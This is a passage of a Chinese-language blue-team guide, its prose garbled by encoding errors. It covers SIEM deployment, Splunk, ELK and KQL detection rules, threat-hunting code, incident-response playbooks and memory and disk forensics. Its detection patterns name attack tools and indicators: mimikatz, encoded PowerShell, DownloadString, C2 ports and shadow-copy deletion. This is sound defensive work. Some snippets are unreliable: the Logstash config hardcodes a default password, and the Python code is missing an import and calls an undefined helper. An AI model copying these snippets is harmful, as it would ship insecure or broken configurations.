| å¯è§æ€§ï¼ˆVisibilityï¼‰ | å…³é”®æ—¥å¿—ç¼ºå¤± | ä¸»è¦ç³»ç»Ÿæ¥å…¥æ—¥å¿—å¹³å° | å…¨é‡æ—¥å¿—è¦†ç›–+èµ„äº§æ ‡ç­¾ |
| æ£€æµ‹ç²¾åº¦ | å¤§é‡è¯¯æŠ¥ | å…³é”®è¡Œä¸ºæœ‰è§„åˆ™ | æ•°æ®ç§‘å­¦+æƒ…æŠ¥é©±åŠ¨åŠ¨æ€æ›´æ–° |
| å“åº”é€Ÿåº¦ | >24å°æ—¶ | 4-8å°æ—¶ | <1å°æ—¶è‡ªåŠ¨åŒ–å“åº” |
| è‡ªåŠ¨åŒ–æ°´å¹³ | æ‰‹å·¥å¤„ç† | åŠè‡ªåŠ¨ç¼–æ’ | SOARé—­ç¯è”åŠ¨ |
| å–è¯èƒ½åŠ› | å•ä¸€ç»ˆç«¯ | å¤šæºå–è¯ | äº‘/å®¹å™¨/å·¥æ§å…¨è¦†ç›– |

> æ¯å­£åº¦æ ¹æ®æ¼”ç»ƒç»“æœæ›´æ–°è¯„åˆ†ï¼Œç»“åˆçº¢é˜Ÿåé¦ˆå»ºç«‹â€œé˜²å¾¡è¿­ä»£Backlogâ€ã€‚

### 3.1 å¨èƒæ£€æµ‹

#### SIEMç³»ç»Ÿéƒ¨ç½²

**Splunké…ç½®**:
```bash
# å®‰è£…Splunk
wget -O splunk-9.0.0-linux-x86_64.tgz 'https://download.splunk.com/...'
tar xvzf splunk-9.0.0-linux-x86_64.tgz -C /opt
cd /opt/splunk/bin
./splunk start --accept-license

# é…ç½®æ•°æ®è¾“å…¥
[monitor:///var/log/auth.log]
disabled = false
index = linux_security
sourcetype = linux_secure

[monitor:///var/log/syslog]
disabled = false
index = linux_os
sourcetype = syslog

# Windowsæ—¥å¿—æ”¶é›†
[WinEventLog://Security]
disabled = false
index = windows_security
checkpointInterval = 5

[WinEventLog://System]
disabled = false
index = windows_system
checkpointInterval = 5

# Sysmoné…ç½®
<Sysmon schemaversion="4.82">
  <EventFiltering>
    <!-- è¿›ç¨‹åˆ›å»ºç›‘æ§ -->
    <ProcessCreate onmatch="include">
      <CommandLine condition="contains">powershell</CommandLine>
      <CommandLine condition="contains">cmd</CommandLine>
      <CommandLine condition="contains">wscript</CommandLine>
    </ProcessCreate>

    <!-- ç½‘ç»œè¿æ¥ç›‘æ§ -->
    <NetworkConnect onmatch="include">
      <DestinationPort condition="is">4444</DestinationPort>
      <DestinationPort condition="is">5555</DestinationPort>
    </NetworkConnect>

    <!-- æ–‡ä»¶åˆ›å»ºç›‘æ§ -->
    <FileCreate onmatch="include">
      <TargetFilename condition="contains">\Temp\</TargetFilename>
      <TargetFilename condition="contains">\AppData\</TargetFilename>
    </FileCreate>
  </EventFiltering>
</Sysmon>
```

**Splunkæ£€æµ‹è§„åˆ™**:
```spl
# æ£€æµ‹Mimikatzä½¿ç”¨
index=windows_security EventCode=4688
(CommandLine="*mimikatz*" OR CommandLine="*sekurlsa*" OR CommandLine="*lsadump*")
| stats count by Computer, User, CommandLine
| where count > 0

# æ£€æµ‹Pass-the-Hash
index=windows_security EventCode=4624 LogonType=3
| stats dc(SourceNetworkAddress) as unique_sources by TargetUserName
| where unique_sources > 10

# æ£€æµ‹PowerShellæ··æ·†
index=windows_security EventCode=4104
(ScriptBlockText="*-enc*" OR ScriptBlockText="*FromBase64String*" OR ScriptBlockText="*Invoke-Expression*")
| stats count by Computer, ScriptBlockText
| head 20

# æ£€æµ‹å¼‚å¸¸ç½‘ç»œè¿æ¥
index=sysmon EventCode=3
DestinationPort IN (4444, 5555, 6666, 7777)
| stats count by SourceIp, DestinationIp, DestinationPort
| where count > 5

# æ£€æµ‹Kerberoasting
index=windows_security EventCode=4769 TicketEncryptionType=0x17
| stats count by TargetUserName, ServiceName
| where count > 10

# æ£€æµ‹Golden Ticket
index=windows_security EventCode=4624 LogonType=3
TargetUserName="Administrator"
| stats dc(SourceNetworkAddress) as unique_ips by TargetUserName
| where unique_ips > 20
```

#### ELK Stackéƒ¨ç½²

**Elasticsearché…ç½®**:
```yaml
# elasticsearch.yml
cluster.name: security-monitoring
node.name: elk-node-1
path.data: /var/lib/elasticsearch
path.logs: /var/log/elasticsearch
network.host: 0.0.0.0
http.port: 9200
discovery.type: single-node

xpack.security.enabled: true
xpack.security.transport.ssl.enabled: true
```

**Logstashé…ç½®**:
```ruby
# logstash.conf
input {
  beats {
    port => 5044
  }

  syslog {
    port => 514
    type => "syslog"
  }
}

filter {
  # Windowsäº‹ä»¶æ—¥å¿—è§£æ
  if [winlog][event_id] == 4624 {
    mutate {
      add_tag => ["windows_logon"]
    }
  }

  if [winlog][event_id] == 4688 {
    mutate {
      add_tag => ["process_creation"]
    }

    # æ£€æµ‹å¯ç–‘è¿›ç¨‹
    if [winlog][event_data][CommandLine] =~ /mimikatz|sekurlsa|powershell.*-enc/ {
      mutate {
        add_tag => ["suspicious_process"]
      }
    }
  }

  # Sysmonè§£æ
  if [winlog][channel] == "Microsoft-Windows-Sysmon/Operational" {
    if [winlog][event_id] == 1 {
      mutate { add_tag => ["sysmon_process_create"] }
    }

    if [winlog][event_id] == 3 {
      mutate { add_tag => ["sysmon_network_connect"] }

      # æ£€æµ‹C2é€šä¿¡
      if [winlog][event_data][DestinationPort] in [4444, 5555, 6666] {
        mutate { add_tag => ["potential_c2"] }
      }
    }
  }

  # GeoIPå¯ŒåŒ–
  geoip {
    source => "src_ip"
    target => "geoip"
  }
}

output {
  elasticsearch {
    hosts => ["localhost:9200"]
    index => "security-logs-%{+YYYY.MM.dd}"
    user => "elastic"
    password => "password"
  }
}
```

**Kibanaå‘Šè­¦è§„åˆ™**:
```json
{
  "name": "Mimikatzæ£€æµ‹",
  "type": "query",
  "query": {
    "bool": {
      "must": [
        {
          "match": {
            "winlog.event_id": "4688"
          }
        },
        {
          "query_string": {
            "query": "CommandLine:(*mimikatz* OR *sekurlsa* OR *lsadump*)"
          }
        }
      ]
    }
  },
  "actions": [
    {
      "type": "email",
      "to": ["soc@company.com"],
      "subject": "é«˜å±å‘Šè­¦ï¼šæ£€æµ‹åˆ°Mimikatzæ´»åŠ¨",
      "body": "ä¸»æœº {{ctx.payload.hits.hits.0._source.Computer}} æ£€æµ‹åˆ°Mimikatzä½¿ç”¨"
    },
    {
      "type": "webhook",
      "url": "https://siem.company.com/api/alerts",
      "method": "POST",
      "body": "{{ctx.payload}}"
    }
  ],
  "schedule": {
    "interval": "1m"
  }
}
```

### æ£€æµ‹å·¥ç¨‹å·¥ä½œæµï¼ˆDetection Engineering Workflowï¼‰
1. **éœ€æ±‚é©±åŠ¨**ï¼šæ ¹æ®çº¢é˜ŸTTPã€å¨èƒæƒ…æŠ¥ã€æ¼æ´å…¬å‘Šã€åˆè§„è¦æ±‚è¾“å‡ºæ£€æµ‹éœ€æ±‚æ–‡æ¡£ï¼ˆDRDï¼‰ã€‚
2. **è§„åˆ™å¼€å‘**ï¼šä½¿ç”¨Sigma/YARA/è‡ªå®šä¹‰è„šæœ¬ç¼–å†™è§„åˆ™ï¼Œå®šä¹‰é˜ˆå€¼ã€å­—æ®µæ˜ å°„ã€æ’é™¤æ¡ä»¶ã€‚
3. **å®éªŒéªŒè¯**ï¼šåœ¨æ²™ç®±æˆ–æµ‹è¯•é›†ç¾¤å¤ç°çº¢é˜Ÿè¡Œä¸ºï¼ŒéªŒè¯è§„åˆ™å‘½ä¸­ç‡ä¸è¯¯æŠ¥ç‡ï¼Œè®°å½•æµ‹è¯•æ•°æ®ä¸æ—¥å¿—æ ·æœ¬ã€‚
4. **ä¸Šçº¿è¯„å®¡**ï¼šè“é˜ŸLead + ç´«é˜Ÿä»£è¡¨è¯„å®¡ï¼Œç¡®è®¤è§„åˆ™æè¿°ã€å‘Šè­¦çº§åˆ«ã€å“åº”æŒ‡å—ï¼›å¿…è¦æ—¶ç”±ç™½é˜Ÿç­¾å­—å½’æ¡£ã€‚
5. **éƒ¨ç½²ä¸ç›‘æ§**ï¼šé€šè¿‡CI/CDæˆ–SOARè‡ªåŠ¨å‘å¸ƒï¼Œè®¾ç½®è§‚å¯ŸæœŸç›‘æ§è¯¯æŠ¥ï¼Œå¿…è¦æ—¶å›æ»šæˆ–è°ƒæ•´ï¼›æ‰€æœ‰å˜æ›´å†™å…¥Changelogã€‚
6. **çŸ¥è¯†åº“æ²‰æ·€**ï¼šå°†è§„åˆ™ã€æ¡ˆä¾‹ã€æ—¥å¿—æ ·æœ¬çº³å…¥æ£€æµ‹çŸ¥è¯†åº“ï¼Œä¸çº¢é˜Ÿå…±äº«ç”¨äºä¸‹ä¸€è½®æ¼”ç»ƒä½è¯æ£€æµ‹æ•ˆæœã€‚

#### æ£€æµ‹è¦†ç›–çŸ©é˜µï¼ˆCoverage Matrixï¼‰
| ATT&CKæˆ˜æœ¯ | å…³é”®æŠ€æœ¯ | æ•°æ®æº | è¦†ç›–è§„åˆ™åç§° | å‘Šè­¦å½’ç±» |
| --- | --- | --- | --- | --- |
| Initial Access | T1566 é’“é±¼ | é‚®ä»¶ç½‘å…³ã€ä»£ç†æ—¥å¿— | `Email_Phish_Click`, `Proxy_Suspicious_URL` | é«˜å±-ç¤¾ä¼šå·¥ç¨‹ |
| Execution | T1059 PowerShell | Windowsäº‹ä»¶4104/4688 | `PS_EncodedCommand`, `PS_DownloadString` | é«˜å±-è„šæœ¬æ‰§è¡Œ |
| Persistence | T1547 å¯åŠ¨é¡¹ | Sysmon 13ã€æ³¨å†Œè¡¨å®¡æ ¸ | `Registry_Run_Add`, `ScheduledTask_Create` | ä¸­å±-æŒä¹…åŒ– |
| Credential Access | T1003 å‡­è¯è½¬å‚¨ | Sysmon 10/4688 | `Credential_Dump_Tool`, `LSASS_Access` | è‡´å‘½-å‡­è¯çªƒå– |
| Lateral Movement | T1021 è¿œç¨‹æœåŠ¡ | 4624ã€ç½‘ç»œæµé‡ | `RDP_MultiHost`, `SMB_PTH` | é«˜å±-æ¨ªå‘ç§»åŠ¨ |
| Command & Control | T1071 åº”ç”¨å±‚åè®® | Zeekã€ä»£ç†æ—¥å¿— | `C2_Suspicious_DNS`, `Beaconing_HTTP` | é«˜å±-è¿œç¨‹æ§åˆ¶ |
| Exfiltration | T1041 C2é€šé“ | æµé‡åˆ†æã€ä»£ç†æ—¥å¿— | `Data_Over_HTTPs`, `Large_Upload` | è‡´å‘½-æ•°æ®æ³„éœ² |

> ç›®æ ‡ï¼šATT&CKæˆ˜æœ¯è¦†ç›–ç‡â‰¥80%ï¼Œæ ¸å¿ƒæŠ€æœ¯è¦†ç›–ç‡â‰¥70%ï¼Œå…³é”®èµ„äº§æ£€æµ‹å“åº”æ—¶é—´<15åˆ†é’Ÿï¼›æ¯å­£åº¦æ»šåŠ¨è¯„ä¼°æå‡10%ã€‚

### 3.2 å¨èƒç‹©çŒï¼ˆThreat Huntingï¼‰

#### å‡è®¾é©±åŠ¨ç‹©çŒ

**ç‹©çŒå‡è®¾åˆ¶å®š**:
```
å‡è®¾1: æ”»å‡»è€…å¯èƒ½ä½¿ç”¨PowerShellè¿›è¡Œå†…å­˜æ‰§è¡Œ
è¯æ®:
- EventID 4104 (PowerShellè„šæœ¬å—æ—¥å¿—)
- Base64ç¼–ç å‘½ä»¤
- DownloadStringæ–¹æ³•è°ƒç”¨

å‡è®¾2: æ”»å‡»è€…å¯èƒ½é€šè¿‡RDPæ¨ªå‘ç§»åŠ¨
è¯æ®:
- EventID 4624 LogonType=10 (è¿œç¨‹äº¤äº’ç™»å½•)
- çŸ­æ—¶é—´å†…å¤šæ¬¡RDPç™»å½•
- éåŠå…¬æ—¶é—´RDPè¿æ¥

å‡è®¾3: æ”»å‡»è€…å¯èƒ½ä½¿ç”¨Pass-the-Hash
è¯æ®:
- EventID 4624 LogonType=3 (ç½‘ç»œç™»å½•)
- NTLMè®¤è¯
- å¤šä¸ªä¸»æœºä½¿ç”¨ç›¸åŒå“ˆå¸Œç™»å½•
```

**ç‹©çŒæŸ¥è¯¢ç¤ºä¾‹**:
```python
# å¨èƒç‹©çŒè‡ªåŠ¨åŒ–è„šæœ¬
import pandas as pd
from elasticsearch import Elasticsearch

class ThreatHunter:
    def __init__(self, es_host):
        self.es = Elasticsearch([es_host])

    def hunt_powershell_obfuscation(self):
        """
        ç‹©çŒPowerShellæ··æ·†
        """
        query = {
            "query": {
                "bool": {
                    "must": [
                        {"match": {"winlog.event_id": "4104"}},
                        {"query_string": {
                            "query": "ScriptBlockText:(*-enc* OR *FromBase64String* OR *IEX*)"
                        }}
                    ]
                }
            },
            "size": 1000
        }

        results = self.es.search(index="security-logs-*", body=query)
        return self.analyze_results(results)

    def hunt_lateral_movement(self):
        """
        ç‹©çŒæ¨ªå‘ç§»åŠ¨
        """
        query = {
            "query": {
                "bool": {
                    "must": [
                        {"match": {"winlog.event_id": "4624"}},
                        {"match": {"winlog.event_data.LogonType": "3"}}
                    ]
                }
            },
            "aggs": {
                "by_user": {
                    "terms": {"field": "winlog.event_data.TargetUserName"},
                    "aggs": {
                        "unique_sources": {
                            "cardinality": {"field": "winlog.event_data.IpAddress"}
                        }
                    }
                }
            }
        }

        results = self.es.search(index="security-logs-*", body=query)

        # åˆ†æï¼šåŒä¸€ç”¨æˆ·ä»å¤šä¸ªIPç™»å½•å¯èƒ½æ˜¯æ¨ªå‘ç§»åŠ¨
        suspicious_users = []
        for bucket in results['aggregations']['by_user']['buckets']:
            if bucket['unique_sources']['value'] > 10:
                suspicious_users.append({
                    'user': bucket['key'],
                    'unique_ips': bucket['unique_sources']['value']
                })

        return suspicious_users

    def hunt_persistence(self):
        """
        ç‹©çŒæŒä¹…åŒ–æœºåˆ¶
        """
        persistence_indicators = [
            # æ³¨å†Œè¡¨Runé”®
            {"match": {"winlog.event_id": "4657"}},  # æ³¨å†Œè¡¨ä¿®æ”¹
            {"query_string": {"query": "ObjectName:(*\\Run OR *\\RunOnce)"}},

            # è®¡åˆ’ä»»åŠ¡
            {"match": {"winlog.event_id": "4698"}},  # è®¡åˆ’ä»»åŠ¡åˆ›å»º

            # æœåŠ¡åˆ›å»º
            {"match": {"winlog.event_id": "7045"}},  # æœåŠ¡å®‰è£…

            # WMIäº‹ä»¶è®¢é˜…
            {"query_string": {"query": "EventConsumer OR EventFilter"}}
        ]

        results = []
        for indicator in persistence_indicators:
            query = {"query": {"bool": {"must": [indicator]}}}
            result = self.es.search(index="security-logs-*", body=query)
            results.append(result)

        return results

    def generate_hunt_report(self):
        """
        ç”Ÿæˆç‹©çŒæŠ¥å‘Š
        """
        report = {
            'timestamp': datetime.now(),
            'findings': {
                'powershell_obfuscation': self.hunt_powershell_obfuscation(),
                'lateral_movement': self.hunt_lateral_movement(),
                'persistence': self.hunt_persistence()
            }
        }

        # ç”ŸæˆHTMLæŠ¥å‘Š
        html_report = f"""
        <html>
        <head><title>å¨èƒç‹©çŒæŠ¥å‘Š</title></head>
        <body>
            <h1>å¨èƒç‹©çŒæŠ¥å‘Š</h1>
            <p>ç”Ÿæˆæ—¶é—´: {report['timestamp']}</p>

            <h2>PowerShellæ··æ·†æ£€æµ‹</h2>
            <table>
                <tr><th>ä¸»æœº</th><th>ç”¨æˆ·</th><th>å‘½ä»¤</th></tr>
                {self._generate_table_rows(report['findings']['powershell_obfuscation'])}
            </table>

            <h2>æ¨ªå‘ç§»åŠ¨æ£€æµ‹</h2>
            <table>
                <tr><th>ç”¨æˆ·</th><th>å”¯ä¸€IPæ•°é‡</th></tr>
                {self._generate_table_rows(report['findings']['lateral_movement'])}
            </table>
        </body>
        </html>
        """

        return html_report
```

### 3.3 åº”æ€¥å“åº”

#### äº‹ä»¶å“åº”æµç¨‹

**NIST SP 800-61å“åº”æ¡†æ¶**:
```
1. å‡†å¤‡ (Preparation)
   â”œâ”€â”€ å»ºç«‹å“åº”å›¢é˜Ÿ
   â”œâ”€â”€ åˆ¶å®šå“åº”è®¡åˆ’
   â”œâ”€â”€ é…ç½®ç›‘æ§å·¥å…·
   â””â”€â”€ å‡†å¤‡å–è¯å·¥å…·

2. æ£€æµ‹ä¸åˆ†æ (Detection & Analysis)
   â”œâ”€â”€ å‘Šè­¦æ¥æ”¶
   â”œâ”€â”€ åˆæ­¥åˆ†ç±»
   â”œâ”€â”€ æ·±åº¦åˆ†æ
   â””â”€â”€ èŒƒå›´ç¡®å®š

3. éåˆ¶ã€æ ¹é™¤ä¸æ¢å¤ (Containment, Eradication & Recovery)
   â”œâ”€â”€ çŸ­æœŸéåˆ¶ï¼ˆéš”ç¦»å—æ„ŸæŸ“ç³»ç»Ÿï¼‰
   â”œâ”€â”€ é•¿æœŸéåˆ¶ï¼ˆæ‰“è¡¥ä¸ã€åŠ å›ºï¼‰
   â”œâ”€â”€ æ ¹é™¤å¨èƒ
   â””â”€â”€ ç³»ç»Ÿæ¢å¤

4. äº‹åæ´»åŠ¨ (Post-Incident Activity)
   â”œâ”€â”€ ç»éªŒæ•™è®­æ€»ç»“
   â”œâ”€â”€ è¯æ®ä¿ç•™
   â”œâ”€â”€ æµç¨‹æ”¹è¿›
   â””â”€â”€ åŸ¹è®­æ›´æ–°
```

**åº”æ€¥å“åº”Playbook**:
```yaml
# Ransomwareå“åº”Playbook
name: "å‹’ç´¢è½¯ä»¶åº”æ€¥å“åº”"
severity: critical
triggers:
  - æ£€æµ‹åˆ°æ–‡ä»¶æ‰¹é‡åŠ å¯†
  - å‘ç°å‹’ç´¢ä¿¡
  - å¼‚å¸¸åŠ å¯†è¿›ç¨‹

æ­¥éª¤:
  1_åˆå§‹å“åº”:
    - æ—¶é™: 15åˆ†é’Ÿ
    - æ“ä½œ:
      - éš”ç¦»å—æ„ŸæŸ“ä¸»æœºï¼ˆæ–­ç½‘ä½†ä¸å…³æœºï¼‰
      - é€šçŸ¥å®‰å…¨å›¢é˜Ÿå’Œç®¡ç†å±‚
      - è®°å½•åˆå§‹æ—¶é—´çº¿
    - è´Ÿè´£äºº: SOCå€¼ç­äººå‘˜

  2_éåˆ¶:
    - æ—¶é™: 1å°æ—¶
    - æ“ä½œ:
      - è¯†åˆ«æ„ŸæŸ“èŒƒå›´
      - éš”ç¦»æ‰€æœ‰å—å½±å“ç³»ç»Ÿ
      - ç¦ç”¨å¯ç–‘è´¦æˆ·
      - é˜»æ–­C2é€šä¿¡ï¼ˆé˜²ç«å¢™è§„åˆ™ï¼‰
    - è´Ÿè´£äºº: å®‰å…¨å·¥ç¨‹å¸ˆ

  3_è°ƒæŸ¥:
    - æ—¶é™: 4å°æ—¶
    - æ“ä½œ:
      - å†…å­˜å–è¯ï¼ˆæ•è·RAMï¼‰
      - ç£ç›˜é•œåƒ
      - ç½‘ç»œæµé‡åˆ†æ
      - æ—¥å¿—åˆ†æï¼ˆæŸ¥æ‰¾åˆå§‹å…¥ä¾µç‚¹ï¼‰
      - æ¶æ„è½¯ä»¶æ ·æœ¬æå–
    - è´Ÿè´£äºº: å–è¯åˆ†æå¸ˆ

  4_æ ¹é™¤:
    - æ—¶é™: 24å°æ—¶
    - æ“ä½œ:
      - åˆ é™¤æ¶æ„è½¯ä»¶
      - é‡ç½®è¢«ç›—å‡­è¯
      - ä¿®è¡¥æ¼æ´
      - æ¸…ç†æŒä¹…åŒ–æœºåˆ¶
    - è´Ÿè´£äºº: ç³»ç»Ÿç®¡ç†å‘˜

  5_æ¢å¤:
    - æ—¶é™: 72å°æ—¶
    - æ“ä½œ:
      - ä»å¤‡ä»½æ¢å¤æ•°æ®
      - é‡å»ºå—æ„ŸæŸ“ç³»ç»Ÿ
      - éªŒè¯ç³»ç»Ÿå®Œæ•´æ€§
      - é€æ­¥æ¢å¤ä¸šåŠ¡
    - è´Ÿè´£äºº: ITè¿ç»´å›¢é˜Ÿ

  6_å¤ç›˜:
    - æ—¶é™: 1å‘¨å
    - æ“ä½œ:
      - ç¼–å†™äº‹ä»¶æŠ¥å‘Š
      - åˆ†ææ ¹æœ¬åŸå› 
      - æ›´æ–°é˜²å¾¡ç­–ç•¥
      - å›¢é˜ŸåŸ¹è®­
    - è´Ÿè´£äºº: CISO
```

#### æ•°å­—å–è¯

**å†…å­˜å–è¯**:
```bash
# Volatilityå†…å­˜åˆ†ææ¡†æ¶

# 1. è·å–å†…å­˜é•œåƒ
# Windows
FTK Imager (GUIå·¥å…·)
winpmem_mini_x64.exe memdump.raw

# Linux
sudo dd if=/dev/mem of=/tmp/memory.dump
# æˆ–ä½¿ç”¨LiME
sudo insmod lime.ko "path=/tmp/memory.lime format=lime"

# 2. ç¡®å®šå†…å­˜é…ç½®æ–‡ä»¶
volatility -f memdump.raw imageinfo

# 3. è¿›ç¨‹åˆ†æ
# åˆ—å‡ºè¿›ç¨‹
volatility -f memdump.raw --profile=Win10x64_19041 pslist
volatility -f memdump.raw --profile=Win10x64_19041 pstree

# æ£€æµ‹éšè—è¿›ç¨‹
volatility -f memdump.raw --profile=Win10x64_19041 psxview

# 4. ç½‘ç»œè¿æ¥åˆ†æ
volatility -f memdump.raw --profile=Win10x64_19041 netscan
volatility -f memdump.raw --profile=Win10x64_19041 connscan

# 5. æ¶æ„ä»£ç æ£€æµ‹
# æ£€æµ‹æ³¨å…¥
volatility -f memdump.raw --profile=Win10x64_19041 malfind
volatility -f memdump.raw --profile=Win10x64_19041 hollowfind

# æå–å¯ç–‘è¿›ç¨‹
volatility -f memdump.raw --profile=Win10x64_19041 procdump -p 1234 -D output/

# 6. æ³¨å†Œè¡¨åˆ†æ
volatility -f memdump.raw --profile=Win10x64_19041 hivelist
volatility -f memdump.raw --profile=Win10x64_19041 printkey -K "Software\Microsoft\Windows\CurrentVersion\Run"

# 7. æ—¶é—´çº¿åˆ†æ
volatility -f memdump.raw --profile=Win10x64_19041 timeliner --output=body > timeline.body
mactime -b timeline.body -d > timeline.csv

# 8. å‘½ä»¤å†å²
volatility -f memdump.raw --profile=Win10x64_19041 cmdscan
volatility -f memdump.raw --profile=Win10x64_19041 consoles
```

**ç£ç›˜å–è¯**:
```bash
# Autopsyå–è¯æ¡†æ¶

# 1. ç£ç›˜é•œåƒè·å–
# ä½¿ç”¨FTK Imageræˆ–dd
sudo dd if=/dev/sda of=/mnt/evidence/disk.img bs=4M status=progress

# è®¡ç®—å“ˆå¸Œå€¼ï¼ˆè¯æ®å®Œæ•´æ€§ï¼‰
md5sum disk.img > disk.img.md5
sha256sum disk.img > disk.img.sha256

# 2. æŒ‚è½½é•œåƒï¼ˆåªè¯»ï¼‰
sudo mount -o ro,loop disk.img /mnt/forensics

# 3. æ–‡ä»¶ç³»ç»Ÿåˆ†æ
# ä½¿ç”¨Sleuth Kit
fls -r disk.img

# æŸ¥æ‰¾å·²åˆ é™¤æ–‡ä»¶
fls -rd disk.img

# æ¢å¤å·²åˆ é™¤æ–‡ä»¶
icat disk.img [inode] > recovered_file

# 4. æ—¶é—´çº¿åˆ†æ
fls -m / -r disk.img > bodyfile
mactime -b bodyfile -d > timeline.csv

# 5. æ–‡ä»¶ç­¾ååˆ†æ
# æ£€æµ‹æ–‡ä»¶ç±»å‹ä¼ªè£…
file * | grep -v "ASCII text"

# 6. å…³é”®è¯æœç´¢
grep -r "password" /mnt/forensics/
grep -r "confidential" /mnt/forensics/

# 7. æµè§ˆå™¨å–è¯
# Chromeå†å²
sqlite3 /mnt/forensics/Users/*/AppData/Local/Google/Chrome/User\ Data/Default/History \
  "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100;"

# Firefoxå†å²
sqlite3 /mnt/forensics/Users/*/AppData/Roaming/Mozilla/Firefox/Profiles/*/places.sqlite \
  "SELECT url, title, visit_count FROM moz_places ORDER BY last_visit_date DESC LIMIT 100;"
```

### 3.4 è“é˜Ÿæ£€æµ‹å‰§æœ¬åº“ï¼ˆDetection Playbooksï¼‰

#### åŠ‡æœ¬ #BT-001ï¼šPowerShell æ¶æ„æ‰§è¡Œæ£€æµ‹
| æ­¥éª¤ | æ“ä½œ | è¯´æ˜ |
| --- | --- | --- |
| æ•°æ®æºç¡®è®¤ | å¯ç”¨PowerShell ScriptBlockæ—¥å¿—(4104)ã€æ¨¡å—æ—¥å¿—(4103)ã€Sysmon(1,7) | éœ€ä¸‹å‘ç»„ç­–ç•¥å¹¶éªŒè¯æˆåŠŸ |
| åŸºçº¿å­¦ä¹  | ç»Ÿè®¡`CommandLine`å¸¸è§æ¨¡å¼ã€ç³»ç»Ÿè´¦å· | ä½¿ç”¨KQL/Splunk baselineåˆ†æ |
| è§„åˆ™ç¼–å†™ | Sigmaï¼š`title: suspicious powershell encoded command` | åŒ…å«`-enc`ã€`FromBase64String`ã€`downloadstring`ç­‰å…³é”®å­— |
| SOARå‰§æœ¬ | è§¦å‘åè‡ªåŠ¨æ”¶é›†`Get-Process`, `Get-Service`, `Get-WinEvent` | ç»“åˆEDR APIæ‰§è¡Œéš”ç¦» |
| å¤æµ‹ | ä½¿ç”¨Invoke-Obfuscationç”Ÿæˆæ ·æœ¬å‘½ä»¤ | ä¸çº¢é˜ŸååŒè¿›è¡ŒéªŒè¯ |

**Splunkæ£€æµ‹æŸ¥è¯¢**ï¼š
```
index=security winlog.channel=Microsoft-Windows-PowerShell/Operational EventCode=4104
| stats values(ScriptBlockText) as script, min(_time) as first_seen by Computer, UserID
| search script="*FromBase64String*" OR script="*IEX*"
```

**KQLæ£€æµ‹æŸ¥è¯¢ï¼ˆDefender for Endpointï¼‰**ï¼š
```
DeviceEvents
| where ActionType == "PowerShellCommand" and Timestamp > ago(1d)
| extend CommandLine = tostring(AdditionalFields["CommandLine"])
| where CommandLine has_any ("-enc", "FromBase64String", "DownloadString")
| summarize count(), make_set(CommandLine) by DeviceName, InitiatingProcessAccountName
```

#### åŠ‡æœ¬ #BT-002ï¼šæ¨ªå‘ç§»åŠ¨ (Pass-the-Hash)
| æ­¥éª¤ | æ“ä½œ | è¯´æ˜ |
| --- | --- | --- |
| æ•°æ®æº | Windowså®‰å…¨æ—¥å¿—(4624/4625/4648)ã€Sysmon 10ã€EDRè®¤è¯æ—¥å¿— | éœ€ä¿ç•™å®Œæ•´ç™»å½•äº‹ä»¶ |
| è§„åˆ™è®¾è®¡ | è¯†åˆ«çŸ­æ—¶é—´å†…åŒä¸€è´¦æˆ·ä»ä¸åŒIPç™»å½•ã€NTLMè®¤è¯ | å»ºç«‹ç™½åå•ï¼ˆè¿ç»´è·³æ¿ï¼‰ |
| æŸ¥è¯¢ç¤ºä¾‹ | `4624 LogonType=3` + åŒä¸€`TargetUserName`å¤šæºIP | ç»“åˆZeek SMBæ—¥å¿—ä½è¯ |
| å“åº”åŠ¨ä½œ | å»ºè®®è‡ªåŠ¨è§¦å‘ï¼šå†»ç»“è´¦å·ã€è®°å½•å“ˆå¸Œã€é€šçŸ¥å€¼ç­ | éœ€ä¸è´¦å·ç®¡ç†æµç¨‹è”åŠ¨ |

```
index=security sourcetype=WinEventLog:Security EventCode=4624 Logon_Type=3 Authentication_Package=NTLM
| stats dc(Source_Network_Address) as src_cnt, values(Source_Network_Address) as srcs by Target_User_Name, _time span=15m
| where src_cnt >= 3
```

#### åŠ‡æœ¬ #BT-003ï¼šæ•°æ®æ¸—å‡ºæ£€æµ‹
| æ•°æ®æº | Proxy/Firewallæ—¥å¿—ã€Zeekã€DNSæ—¥å¿— |
| æŒ‡æ ‡ | å‡ºå£æµé‡å¤§å°ã€ä¼šè¯æŒç»­æ—¶é—´ã€åŸŸåç†µå€¼ |
| æŸ¥è¯¢ | `where bytes_out > 10000000 and dest_port in (443,8080) and not dest_domain in whitelist` |
| å“åº” | è‡ªåŠ¨é˜»æ–­ã€é€šçŸ¥ç½‘ç»œå›¢é˜Ÿã€è§¦å‘å–è¯é‡‡é›† |

**Zeekè„šæœ¬ç‰‡æ®µ**ï¼š
```zeek
redef Notice::policy += {
    [$pred(n: Notice::Info) =
        n$note == Notice::HTTP::Large-Upload,
        $actions = Notice::ACTION_EMAIL]
};
```

#### åŠ‡æœ¬ #BT-004ï¼šå‹’ç´¢è½¯ä»¶åˆæœŸæ£€æµ‹
- **è¡Œä¸ºç‰¹å¾**ï¼šçŸ­æ—¶é—´å†…å¤§é‡æ–‡ä»¶è¢«ä¿®æ”¹ã€åˆ›å»ºå¯ç–‘è¿›ç¨‹ã€å‡ºç°åŠ å¯†åç¼€ã€‚
- **æ£€æµ‹æ‰‹æ®µ**ï¼š
  - æ–‡ä»¶å®¡è®¡ï¼šä½¿ç”¨FSRMæˆ–EDRç›‘æ§`*.locked`ã€`*.encrypted`ç­‰åç¼€ã€‚
  - è¿›ç¨‹è¡Œä¸ºï¼šæŸ¥`vssadmin delete shadows`ã€`wmic shadowcopy delete`ã€‚
  - ç½‘ç»œè¡Œä¸ºï¼šéšæœºå­åŸŸã€Torå‡ºå£ã€æ¯”ç‰¹å¸åœ°å€ã€‚
- **KQLç¤ºä¾‹**ï¼š
```
DeviceFileEvents
| where Timestamp > ago(1h)
| where ActionType == "FileRenamed" and FileName endswith ".locked"
| summarize count() by DeviceName, InitiatingProcessFileName
| where count_ > 500
```
- **å“åº”åŠ¨ä½œ**ï¼š
  1. è‡ªåŠ¨éš”ç¦»ç»ˆç«¯ï¼›
  2. é˜»æ–­å¯ç–‘C2åŸŸå/IPï¼›
  3. è§¦å‘å–è¯é‡‡é›†ï¼ˆå†…å­˜ã€ç£ç›˜ã€æ—¥å¿—ï¼‰ï¼›
  4. é€šè¿‡SOARåˆ›å»ºå·¥å•å¹¶é€šçŸ¥ä¸šåŠ¡ã€‚

### 3.5 å¨èƒç‹©çŒæ¡ˆä¾‹ç ”ç©¶
#### æ¡ˆä¾‹ä¸€ï¼šéšè”½çš„Cobalt Strike Beacon
